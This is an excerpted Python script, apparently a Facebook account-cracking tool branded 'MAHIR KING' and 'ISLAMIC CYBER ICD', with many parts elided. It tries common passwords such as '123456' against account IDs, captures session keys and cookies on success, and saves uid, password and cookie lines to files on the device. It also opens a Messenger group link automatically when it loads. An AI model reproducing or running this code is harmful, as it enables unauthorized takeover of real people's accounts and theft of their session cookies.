#======== [  SC SEND BY : MAHIR KING
#=======[ TELIGERM : ISLAMIC CYBER ICD
...
class sort:
    ...
    def clear():
        os.system("clear")
    os.system("xdg-open https://m.me/j/AbbV7tFsa0cgPCc6/")
    os.system("xdg-open https://m.me/j/AbbV7tFsa0cgPCc6/")
    def logo():
        aci=f'''
	[white]▉▉▉▉
...
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
	...
	[white]
	[white]\n[red1]{sort.line()}\n     [red1]✗ [chartreuse1]Developer [orange3]▶  [chartreuse1]MAHIR\n     [red1]✗ [light_green]Status   
	[red1]✗ [chartreuse1]SEND BY ➤ ISLAMIC CYBER ICD [orange3]▶
 [orange3]▶  [medium_purple1][r]https://m.me/j/AbbV7tFsa0cgPCc6/[/r]\n[red1]{sort.line()}'''
        print(aci)
...
def info():
    sort.clear()
    print('     [b]    [red1] WELCOME TO MAHIR KING GIVE SCRIPT          ')
    time.sleep(4)
    sort.clear()
    ...
    try:
        ...
        for pw in pwx:
            ...
            if "session_key" in po:
                ...
                open("/sdcard/MAHIR-ICD-SEND-TANIM_file.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
    ...
    try:
        ...
        for ps in pwx:
            ...
            if "session_key" in po:
                ...
                coki=";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f"\r\r[reverse white][AKASH-SC-SEND-KALYAN-OK][/reverse white] [cyan]{uid} [white]|[/white][bright_red] {ps}     \n[white][🍪+[bold cyan]{str(len(oks))}[/bold cyan][white]][pale_green1]{coki} \n{sort.line()}")
                open("/sdcard/MAHIR-ICD-SEND-TANIM_number.txt","a").write(uid+"|"+ps+"|"+coki+"\n")
                break
            elif "Please Confirm Email" in str(po):
                oks.append(uid)
                uid=po["uid"]
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789"]:
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/MAHI-ICD-SEND-TANIM_old.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/MAHIR-ICD-SEND-TANIM_old.txt","a").write(uid+"|"+pw+"\n")
                break
